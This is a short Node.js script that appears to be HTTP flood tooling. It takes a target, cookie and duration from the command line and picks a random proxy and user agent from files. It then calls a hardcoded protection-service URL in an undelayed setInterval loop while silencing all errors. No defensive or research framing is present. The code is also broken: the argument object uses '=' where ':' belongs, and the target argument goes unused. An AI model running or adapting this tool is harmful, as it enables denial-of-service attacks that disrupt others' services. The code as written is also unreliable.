const Bottleneck = require('bottleneck')
const client = require('./index.js')(new Bottleneck({
  maxConcurrent: 10, //concurrent requests at the same time
  minTime: 333 //slow down, limit rate to keep pause between requests, reead the [docs](https://npmjs.com/package/bottleneck)
}))
const pathTatget = {
	cookie = process.argv[3],
	target = process.argv[2],
	duration = process.argv[4]
}
const fs = require("fs");
var proxies = fs.readFileSync("http.txt", 'utf-8').replace(/\r/g, '').split('\n');
var proxy1 = proxies[Math.floor(Math.random()* proxies.length)]
var uas = fs.readFileSync("ua.txt", 'utf-8').replace(/\r/g, '').split('\n');
var ua = uas[Math.floor(Math.random()* uas.length)]
const proxy = proxy1.toString();
setInterval(()=> {
client.setCookie(pathTatget.cookie)
client.setProxy({host: proxy.split(":")[0], port: proxy.split(":")[1]})
client('https://graph.vshield.pro/')
  .then((data) => {
    console.log(data)
  });    
})

process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});